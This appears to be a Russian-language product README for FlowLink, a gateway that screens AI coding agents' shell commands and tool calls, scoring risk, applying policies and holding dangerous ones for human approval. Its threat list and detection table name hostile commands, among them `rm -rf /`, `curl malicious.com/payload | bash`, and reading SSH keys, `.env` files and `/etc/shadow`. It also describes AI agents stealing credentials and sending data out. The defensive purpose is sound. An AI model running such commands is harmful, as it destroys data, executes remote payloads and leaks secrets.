## От чего защищает

AI-агенты для программирования выполняют shell-команды на ваших серверах. Без защиты они могут:

### Shell-инъекции
Агент выполняет `rm -rf /` или `curl malicious.com/payload | bash` → **сервер скомпрометирован.**

### Кража учётных данных
Агент читает `~/.ssh/id_rsa`, `.env`, AWS-ключи, пароли от БД → **секреты утекли.**

### Утечка данных
Агент отправляет проприетарный код, данные клиентов или коммерческую тайну на внешние серверы → **IP украден.**

**FlowLink стоит между AI-агентами и сервером. Каждая команда анализируется и одобряется (или блокируется) до выполнения.**

## Как это работает

```
  AI-агент                FlowLink                Сервер
┌──────────┐          ┌──────────────┐         ┌──────────┐
│          │          │              │         │          │
│  Claude  │──MCP──▶ │  7-уровневый │─разреш─▶│  Bash    │
│  Cursor  │  /WS    │  анализ      │         │  Server  │
│  Copilot │          │              │─блок───│          │
│  Custom  │          │  < 1мс       │         │          │
└──────────┘          └──────────────┘         └──────────┘
                             │
                      ┌──────┴──────┐
                      │  Дашборд    │
                      │  Аудит-лог  │
                      │  Политики   │
                      └─────────────┘
```

1. **Подключение** — AI-агент подключается через MCP или WebSocket
2. **Перехват** — каждая команда/tool-call проходит через FlowLink
3. **Анализ** — 7-уровневый анализ угроз за < 1мс
4. **Решение** — разрешить, предупредить, заблокировать или отправить на согласование
5. **Логирование** — каждое действие записывается в аудит-лог

## 7 уровней защиты

| Уровень | Что делает | Пример |
|---------|-----------|--------|
| **1. Сопоставление шаблонов** | Regex + пользовательские правила | Определяет `rm -rf`, `curl \| bash`, `wget` на неизвестные хосты |
| **2. Оценка рисков** | Оценка 0-100 для каждой команды по контексту | `ssh-keygen` = 15, `cat /etc/shadow` = 95 |
| **3. Движок политик** | Декларативные правила (на агента, на организацию) | «Блокировать все сетевые команды после 18:00» |
| **4. Согласование** | Человек в цикле для опасных команд | Уведомление в Slack/Telegram → подтвердить/отклонить |
| **5. Обучение паттернам** | Автоопределение новых угроз | Учится на заблокированных командах всех пользователей |
| **6. Shield** | Перехват на уровне ядра (eBPF) | Перехват до `execve()`, невозможно обойти |
| **7. MCP-шлюз** | Контроль доступа к инструментам | Ограничение MCP-инструментов для каждого агента |

## Возможности

### 🔌 MCP-шлюз
FlowLink работает как MCP-прокси — AI-агенты подключаются к `https://flowlink.flow-masters.ru/mcp` со своим API-ключом. Каждый вызов инструмента проходит через пайплайн анализа.

Работает с: **Claude Code, Cursor, Windsurf, любой MCP-совместимый клиент.**

### 👤 Согласование команд
Опасные команды удерживаются для ревью. Подтвердите или отклоните через:
- Веб-дашборд
- Telegram-бот
- REST API

### 📊 Аудит-лог
Каждая команда логируется с:
- Полным текстом команды
- Оценкой риска и сработавшими правилами
- Идентификатором агента и IP-адресом
- Временем и результатом (разрешена/заблокирована/на согласовании)
- Экспорт в SIEM (CEF/LEEF/JSON)

### 🛡️ Движок политик
Декларативные YAML-политики:
```yaml
# Блокировать сетевой доступ Claude Code после рабочих часов
policies:
  - name: no-network-after-hours
    agents: ["claude-code-*"]
    actions: ["network"]
    schedule: "18:00-09:00"
    decision: block
    message: "Сетевой доступ заблокирован вне рабочих часов"
```

### 🧠 Обучение паттернам
FlowLink обучается на паттернах угроз всех пользователей. Когда новый вектор атаки обнаружен в одном развёртывании, все развёртывания получают защиту в течение минут.

### 🔐 Zero Trust архитектура
- API-ключ аутентификация для каждого агента
- RBAC (администратор, оператор, наблюдатель)
- Оценка доверия устройств (trust score)
- Управление сессиями с автоочисткой
- Поддержка 2FA

## Архитектура

FlowLink — распределённая система из трёх компонентов:

```
┌─────────────────────────────────────────────────┐
│                 FlowLink Cloud                   │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  Relay   │  │ Dashboard│  │  БД политик  │  │
│  │ (WebSocket│  │ (Next.js)│  │ (PostgreSQL) │  │
│  │  сервер) │  │          │  │              │  │
│  └────┬─────┘  └──────────┘  └──────────────┘  │
│       │                                          │
│  ┌────┴─────────────────────────────────────┐   │
│  │  Движок анализа (7 уровней)              │   │
│  │  Шаблоны → Риски → Политики → Соглас. → │   │
│  │  Обучение → Shield → MCP                 │   │
│  └──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
         │                    │
    WSS/MCP               HTTPS API
         │                    │
┌────────┴────────┐   ┌──────┴──────┐
│  FlowLink Agent  │   │  Дашборд    │
│ (на вашем сервере)│  │  (браузер)  │
└─────────────────┘   └─────────────┘
```

Написан на Rust для производительности и безопасности. ~96 000 строк production-кода.
